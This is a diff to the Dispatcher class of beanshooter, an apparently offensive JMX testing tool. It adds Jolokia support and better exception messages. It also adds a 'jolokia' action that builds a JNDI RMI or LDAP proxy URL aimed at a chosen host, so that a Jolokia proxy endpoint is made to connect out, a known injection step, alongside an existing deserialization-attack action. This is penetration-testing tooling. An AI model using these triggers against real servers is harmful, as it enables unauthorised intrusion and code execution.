@@ -15,6 +15,8 @@ import javax.management.ObjectName;
 import javax.management.ReflectionException;
 import javax.management.RuntimeMBeanException;
 
+import org.jolokia.client.exception.J4pRemoteException;
+
 import de.qtc.beanshooter.cli.ArgumentHandler;
 import de.qtc.beanshooter.exceptions.AuthenticationException;
 import de.qtc.beanshooter.exceptions.ExceptionHandler;
@@ -166,10 +168,20 @@ public class Dispatcher {
             }
         }
 
-        enumHelper.enumSerial();
+        if (BeanshooterOption.CONN_JOLOKIA.getBool())
+            enumHelper.enumJolokiaVersion();
+
+        else
+            enumHelper.enumSerial();
 
         if (!access)
             return;
+
+        if (BeanshooterOption.CONN_JOLOKIA.getBool())
+        {
+            Logger.lineBreak();
+            enumHelper.enumJolokiaProxy();
+        }
 
         Logger.lineBreak();
         Set<ObjectInstance> mbeans = enumHelper.enumMBeans();
@@ -182,6 +194,12 @@ public class Dispatcher {
      */
     public void serial()
     {
+        if (BeanshooterOption.CONN_JOLOKIA.getBool())
+        {
+            Logger.eprintlnMixedYellow("The serial action", "is not", "supported for Jolokia based connections.");
+            Utils.exit();
+        }
+
         Logger.println("Attemting deserialization attack on JMX endpoint.");
         Logger.lineBreak();
         Logger.increaseIndent();
@@ -264,6 +282,12 @@ public class Dispatcher {
                 Logger.eprintlnMixedYellow("Encountered unexpected", t.getClass().getName(), "after the payload object was sent.");
 
             ExceptionHandler.showStackTrace(e);
+        }
+
+        catch (J4pRemoteException e)
+        {
+            // Actually unreachable code, as serial action is not supported for Jolokia
+            ExceptionHandler.handleJ4pRemoteException(e, "during deserialization attack");
         }
     };
 
@@ -353,8 +377,19 @@ public class Dispatcher {
 
         catch (MBeanException | ReflectionException | IOException e)
         {
-            Logger.printlnMixedYellow("Caught", e.getClass().getName(), String.format("while invoking %s on %s.", methodName, objectName.toString()));
-            Logger.println("beanshooter does not handle exceptions for custom method invocations.");
+            Throwable t = ExceptionHandler.getCause(e);
+            String message = t.getMessage();
+
+            if (message.contains("No operation " + methodName))
+            {
+                if (message.contains("Known signatures: "))
+                    ExceptionHandler.noOperationAlternative(e, signature, methodName, message);
+
+                ExceptionHandler.noOperation(e, signature);
+            }
+
+            Logger.eprintlnMixedYellow("Caught", e.getClass().getName(), String.format("while invoking %s on %s.", methodName, objectName.toString()));
+            Logger.eprintln("beanshooter does not handle exceptions for custom method invocations.");
             ExceptionHandler.stackTrace(e);
         }
     }
@@ -429,8 +464,16 @@ public class Dispatcher {
 
         catch (MBeanException | ReflectionException | IOException e)
         {
-            Logger.printlnMixedYellow("Caught", e.getClass().getName(), String.format("while obtaining attribute %s from %s", attrName, objectName));
-            Logger.println("beanshooter does not handle exceptions for custom method invocations.");
+            if (e instanceof ReflectionException && e.getMessage().contains("Cannot find setter method"))
+            {
+                Logger.eprintlnMixedYellow("Caught", e.getClass().getName(), String.format("while setting attribute %s from %s", attrName, objectName));
+                Logger.eprintlnMixedBlue("There seems to be", "no setter available", "for the requested attribute.");
+                ExceptionHandler.showStackTrace(e);
+                Utils.exit();
+            }
+
+            Logger.eprintlnMixedYellow("Caught", e.getClass().getName(), String.format("while accessing attribute %s from %s", attrName, objectName));
+            Logger.eprintln("beanshooter does not handle exceptions for custom attribute access.");
             ExceptionHandler.stackTrace(e);
             Utils.exit();
         }
@@ -462,5 +505,35 @@ public class Dispatcher {
             de.qtc.beanshooter.mbean.Dispatcher disp = new de.qtc.beanshooter.mbean.Dispatcher(mbean);
             disp.info();
         }
+    }
+
+    /**
+     * Create an outbound RMI or LDAP connection from a Jolokia endpoint running in proxy mode.
+     */
+    public void jolokia()
+    {
+        BeanshooterOption.CONN_JOLOKIA.setValue(true);
+        PluginSystem.init(null);
+
+        String host = ArgumentHandler.require(BeanshooterOption.JOLOKIA_HOST);
+        int port = ArgumentHandler.require(BeanshooterOption.JOLOKIA_PORT);
+
+        String name = BeanshooterOption.JOLOKIA_LOOKUP.getValue("beanshooter");
+        String proxyUrl = "";
+
+        if (BeanshooterOption.JOLOKIA_LDAP.getBool())
+            proxyUrl = String.format("service:jmx:Rmi:///jndi/ldap://%s:%d/%s", host, port, name);
+
+        else
+            proxyUrl = String.format("service:jmx:Rmi:///jndi/rmi://%s:%d/%s", host, port, name);
+
+        BeanshooterOption.CONN_JOLOKIA_PROXY.setValue(proxyUrl);
+        Logger.printlnMixedYellow("Attempting to trigger outboud connection to", String.format("%s:%d", host, port));
+        Logger.printlnMixedBlue("Using proxy service URL:", proxyUrl);
+
+        MBeanServerClient mBeanServerClient = getMBeanServerClient();
+        mBeanServerClient.getMBeans();
+
+        Logger.printlnMixedYellow("Obtained", "no Exception", "while performing the list operation via the specified proxy.");
     }
 }
